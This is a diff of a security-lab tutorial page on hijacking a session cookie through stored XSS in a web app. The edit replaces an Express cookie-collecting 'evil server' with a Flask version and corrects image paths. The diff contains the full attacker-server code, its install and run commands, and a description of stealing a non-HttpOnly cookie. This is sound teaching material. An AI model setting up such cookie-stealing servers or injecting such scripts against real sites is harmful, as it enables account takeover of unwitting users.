@@ -25,7 +25,7 @@ Lets start the application and login with the default credentials.
 username : admin  
 password: admin
 
-![](../../.gitbook/assets/nodejs/Session-hijacking-XSS/1.png)
+![](../../.gitbook/assets/nodejs/Session-Hijacking-XSS/1.png)
 
 After authenticating to the server we can see that the user has a text-area
 field at his dissposal to insert user input. When we press submit we find that
@@ -39,58 +39,52 @@ We can tell if we can hijack the session information by inspecting the cookies a
 
 Highlighted in red we find this attribute and see that it is not activated for this application
 
-![](../../.gitbook/assets/nodejs/Session-hijacking-XSS/2.png)
+![](../../.gitbook/assets/nodejs/Session-Hijacking-XSS/2.png)
 
 Now, we can inject the a piece of malicious javascript to see if we can prompt an alert box that displays the applications session information.
 
-![](../../.gitbook/assets/nodejs/Session-hijacking-XSS/3.png)
+![](../../.gitbook/assets/nodejs/Session-Hijacking-XSS/3.png)
 
-![](../../.gitbook/assets/nodejs/Session-hijacking-XSS/4.png)
+![](../../.gitbook/assets/nodejs/Session-Hijacking-XSS/4.png)
 
 ## Exploitation
 
 Now that we have determined that we can
 
-1. inject malicious javascript
+1\) inject malicious javascript
 
-2. The HttpOnly attribute is not set for the session cookie
+2\) The HttpOnly attribute is not set for the session cookie
 
 We can start building our malicious payload and hijack the session information to our malicious webserver.
 
-```javascript
-const express = require("express");
-const app = express();
+```python
+from flask import Flask, request, url_for, render_template, redirect, make_response
+import requests
 
-app.use(express.static(__dirname + "/static"));
-app.use(express.urlencoded({ extended: true }));
+app = Flask(__name__, static_url_path='/static', static_folder='static')
+app.config['DEBUG'] = True
 
-app.get("/", (req, res) => {
-  console.log(req.query);
-  res.render("evil.ejs");
-});
+@app.route("/<steal_cookie>", methods=['GET'])
+def start(steal_cookie):
+    return render_template("evil.html")
 
-const port = process.env.PORT || 1337;
-
-app.listen(port, "0.0.0.0", () =>
-  console.log(`Listening on port ${port}...!!!`)
-);
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=1337)
 ```
 
-Save the snippet above to &gt; evil_server.js and run the commands below to install some dependencies.
+Save the snippet above to > app.py and run the commands below to install some dependencies.
 
-```text
-$ npm install express ejs
+```
+$ pip install flask
+$ pip install requests
+$ python app.py
 ```
 
-Of course you can also run your app on whatever service you want it does not have to be nodeJs express.
-
-```text
-$ node evil_server.js
-```
+Of course you can also run your app on whatever service you want it does not have to be python flask.
 
 Now that the service is running we want to inject the malicious piece of javascript that is responsible for hijacking the victims session information.
 
-![](../../.gitbook/assets/nodejs/Session-hijacking-XSS/5.png)
+![](../../.gitbook/assets/nodejs/Session-Hijacking-XSS/5.png)
 
 ```html
 <script>
@@ -100,6 +94,6 @@ Now that the service is running we want to inject the malicious piece of javascr
 
 After injecting the malicious javascript in the text-area field we see the stolen cookie in the server logs.
 
-![](../../.gitbook/assets/nodejs/Session-hijacking-XSS/6.png)
+![](../../.gitbook/assets/nodejs/Session-Hijacking-XSS/6.png)
 
 The attacker can now change the session cookie value in his browers console by the session cookie that we hijacked with our malicous payload to "hijack" the victims account.
